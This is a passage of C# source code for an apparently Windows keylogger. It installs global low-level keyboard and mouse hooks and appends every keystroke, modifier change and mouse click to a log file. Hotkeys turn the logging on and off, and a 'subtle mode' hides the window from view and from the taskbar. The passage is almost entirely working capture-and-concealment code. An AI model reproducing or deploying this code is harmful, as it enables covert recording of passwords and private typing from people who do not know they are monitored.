        private LowLevelKeyboardProc _procKey = null;
        private static IntPtr _hookIDKey = IntPtr.Zero;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        //Import DLLs
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        //
        // HookCallbackKey(int nCode, IntPtr wParam, IntPtr lParam)
        // Callback for when a keyboard event occurs
        //
        private IntPtr HookCallbackKey(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            //Handle Modifier Key States
            if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift && !ShiftDown)
            {
                ShiftDown = true;
                if (KeyloggerActivated)
                {
                    using (StreamWriter w = File.AppendText(profileData.keylogSaveLocation))
                    {
                        w.Write("<ShiftDown>");
                        w.Close();
                    }
                }
            }
            else if ((Control.ModifierKeys & Keys.Alt) == Keys.Alt && !AltDown)
            {
                AltDown = true;
                if (KeyloggerActivated)
                {
                    using (StreamWriter w = File.AppendText(profileData.keylogSaveLocation))
                    {
                        w.Write("<AltDown>");
                        w.Close();
                    }
                }
            }
            else if ((Control.ModifierKeys & Keys.Control) == Keys.Control && !CtrlDown)
            {
                CtrlDown = true;
                if (KeyloggerActivated)
                {
                    using (StreamWriter w = File.AppendText(profileData.keylogSaveLocation))
                    {
                        w.Write("<CtrlDown>");
                        w.Close();
                    }
                }
            }
            else if ((Control.ModifierKeys & Keys.Shift) != Keys.Shift && ShiftDown)
            {
                ShiftDown = false;
                if (KeyloggerActivated)
                {
                    using (StreamWriter w = File.AppendText(profileData.keylogSaveLocation))
                    {
                        w.Write("<ShiftUp>");
                        w.Close();
                    }
                }
            }
            else if ((Control.ModifierKeys & Keys.Alt) != Keys.Alt && AltDown)
            {
                AltDown = false;
                if (KeyloggerActivated)
                {
                    using (StreamWriter w = File.AppendText(profileData.keylogSaveLocation))
                    {
                        w.Write("<AltUp>");
                        w.Close();
                    }
                }
            }
            else if ((Control.ModifierKeys & Keys.Control) != Keys.Control && CtrlDown)
            {
                CtrlDown = false;
                if (KeyloggerActivated)
                {
                    using (StreamWriter w = File.AppendText(profileData.keylogSaveLocation))
                    {
                        w.Write("<CtrlUp>");
                        w.Close();
                    }
                }
            }

            if (nCode >= 0 && tcNSSKeylogger.SelectedIndex == 0)
            {
                //Check Hotkeys
                if (((profileData.ActivationKey.modifierKeys == Control.ModifierKeys &&
                    profileData.ActivationKey.key == Keys.None) ||
                    (profileData.DeactivationKey.modifierKeys == Control.ModifierKeys &&
                    profileData.DeactivationKey.key == Keys.None) ||
                    (profileData.SubtleModeKey.modifierKeys == Control.ModifierKeys &&
                    profileData.SubtleModeKey.key == Keys.None)))
                { //Ctrl, Shift, or Alt only
                    int vkCode = Marshal.ReadInt32(lParam);
                    ToggleKeylogger(Keys.None);
                    if (cbSubtleMode.Checked && profileData.SubtleModeKey.modifierKeys == Control.ModifierKeys &&
                        profileData.SubtleModeKey.key == Keys.None)
                    { //Handle subtle mode
                        if (!SubtleModeActivated && !StartupSubtleMode)
                        {
                            this.Hide(); //enter subtle mode
                            SubtleModeActivated = true;
                        }
                        else if (SubtleModeActivated)
                        {
                            if (StartupSubtleMode)
                            {
                                StartupSubtleMode = false;
                                this.WindowState = FormWindowState.Normal;
                                this.ShowInTaskbar = true;
                            }
                            else
                                this.Show(); //exit subtle mode
                            SubtleModeActivated = false;
                        }
                    }
                    if (cbSuppressHotkeys.Checked)
                    { //suppress the key
                        return (IntPtr)1; //dummy value
                    }
                }
                else if ((wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
                {
                    int vkCode = Marshal.ReadInt32(lParam);

                    //Check Windows Key State
                    if (((Keys)vkCode == Keys.LWin ||
                        (Keys)vkCode == Keys.RWin) && !WinDown)
                    {
                        WinDown = true;
                        if (KeyloggerActivated)
                        {
                            using (StreamWriter w = File.AppendText(profileData.keylogSaveLocation))
                            {
                                w.Write("<WinDown>");
                                w.Close();
                            }
                        }
                    }

                    if (((Keys)vkCode == profileData.ActivationKey.key && profileData.ActivationKey.modifierKeys == Control.ModifierKeys) ||
                        ((Keys)vkCode == profileData.DeactivationKey.key && profileData.DeactivationKey.modifierKeys == Control.ModifierKeys) ||
                        ((Keys)vkCode == profileData.SubtleModeKey.key && profileData.SubtleModeKey.modifierKeys == Control.ModifierKeys))
                    { //hotkey pressed
                        ToggleKeylogger((Keys)vkCode);
                        if (cbSubtleMode.Checked && (Keys)vkCode == profileData.SubtleModeKey.key &&
                            profileData.SubtleModeKey.modifierKeys == Control.ModifierKeys)
                        { //Handle subtle mode
                            if (!SubtleModeActivated && !StartupSubtleMode)
                            {
                                this.Hide(); //enter subtle mode
                                SubtleModeActivated = true;
                            }
                            else if (SubtleModeActivated)
                            {
                                if (StartupSubtleMode)
                                {
                                    StartupSubtleMode = false;
                                    this.WindowState = FormWindowState.Normal;
                                    this.ShowInTaskbar = true;
                                }
                                else
                                    this.Show(); //exit subtle mode
                                SubtleModeActivated = false;
                            }
                        }
                        if (cbSuppressHotkeys.Checked)
                        { //suppress the key
                            return (IntPtr)1; //dummy value
                        }
                    }
                    else if (KeyloggerActivated)
                    { //Keylog!
                        using (StreamWriter w = File.AppendText(profileData.keylogSaveLocation))
                        {
                            vkCode = Marshal.ReadInt32(lParam);
                            w.Write(keyStringConverter.KeyToKeylogString((Keys)vkCode));
                            w.Close();
                        }
                    }
                }
                else if ((wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP))
                {
                    int vkCode = Marshal.ReadInt32(lParam);

                    //Check Windows Key State
                    if (((Keys)vkCode == Keys.LWin ||
                        (Keys)vkCode == Keys.RWin) && WinDown)
                    {
                        WinDown = false;
                        if (KeyloggerActivated)
                        {
                            using (StreamWriter w = File.AppendText(profileData.keylogSaveLocation))
                            {
                                w.Write("<WinUp>");
                                w.Close();
                            }
                        }
                    }
                }
            }

            return CallNextHookEx(_hookIDKey, nCode, wParam, lParam);
        }

        //
        // SetHookKey(LowLevelKeyboardProc proc)
        // Hooks the low level hook to the process
        //
        private static IntPtr SetHookKey(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        #endregion

        #region Low Level Mouse Hook
        //===========================================================================
        //
        // Low Level Mouse Hook
        //
        //===========================================================================

        //Define input constants
        private const int WH_MOUSE_LL = 14;
        private enum MouseMessages
        {
            WM_LBUTTONDOWN = 0x0201,
            WM_LBUTTONUP = 0x0202,
            WM_MOUSEMOVE = 0x0200,
            WM_MOUSEWHEEL = 0x020A,
            WM_RBUTTONDOWN = 0x0204,
            WM_RBUTTONUP = 0x0205
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct MSLLHOOKSTRUCT
        {
            public uint mouseData;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        //Define Global Variables
        private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelMouseProc _procMouse = null;
        private static IntPtr _hookIDMouse = IntPtr.Zero;

        //Define output constants
        private const UInt32 MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const UInt32 MOUSEEVENTF_LEFTUP = 0x0004;
        private const UInt32 MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        private const UInt32 MOUSEEVENTF_MIDDLEUP = 0x0040;
        private const UInt32 MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const UInt32 MOUSEEVENTF_RIGHTUP = 0x0010;
        private const UInt32 MOUSEEVENTF_WHEEL = 0x0800;

        //Import DLLs
        [DllImport("user32.dll")] //Mouse Output
        private static extern void mouse_event(uint dwFlags, uint dx, uint dy, int dwData, uint dwExtraInf);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] //Mouse Hook
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);

        //
        // HookCallbackMouse(int nCode, IntPtr wParam, IntPtr lParam)
        // Callback for when a mouse event occurs
        //
        private IntPtr HookCallbackMouse(
        int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && KeyloggerActivated && tcNSSKeylogger.SelectedIndex == 0)
            { //Log mouse clicks
                if (MouseMessages.WM_LBUTTONDOWN == (MouseMessages)wParam)
                {
                    using (StreamWriter w = File.AppendText(profileData.keylogSaveLocation))
                    {
                        w.Write("<LClick>");
                        w.Close();
                    }
                }
                else if (MouseMessages.WM_RBUTTONDOWN == (MouseMessages)wParam)
                {
                    using (StreamWriter w = File.AppendText(profileData.keylogSaveLocation))
                    {
                        w.Write("<RClick>");
                        w.Close();
                    }
                }
            }

            return CallNextHookEx(_hookIDMouse, nCode, wParam, lParam);
        }

        //
        // SetHookMouse(LowLevelMouseProc proc)
        // Hooks the low level hook to the process
        //
        private static IntPtr SetHookMouse(LowLevelMouseProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_MOUSE_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        #endregion
    }
}
